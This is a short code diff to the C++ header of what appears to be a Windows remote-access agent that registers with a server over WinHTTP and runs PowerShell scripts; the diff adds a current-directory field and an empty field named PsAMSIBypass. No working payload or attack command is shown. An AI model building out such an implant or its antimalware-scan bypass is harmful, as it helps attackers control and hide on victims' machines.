@@ -4,7 +4,7 @@
 #include <map>
 #include <Windows.h>
 #include <winhttp.h>
-
+#include <numeric>
 #include "Config.h"
 
 #pragma comment(lib, "winhttp.lib")
@@ -18,11 +18,11 @@ private:
 	std::string ComputerName;
 	std::string AgentID; // MD5 of computername or something
 	std::string ipAddress;
-	std::vector<std::string> FunctionArguments;
+	std::string CurDir = "C:\\"; // current directory. ( for ls )
 	unsigned int port;
 
 	std::string PsScript = "";
-
+	std::string PsAMSIBypass = "";
 
 public:
 	void Register(std::string ip, unsigned int port);
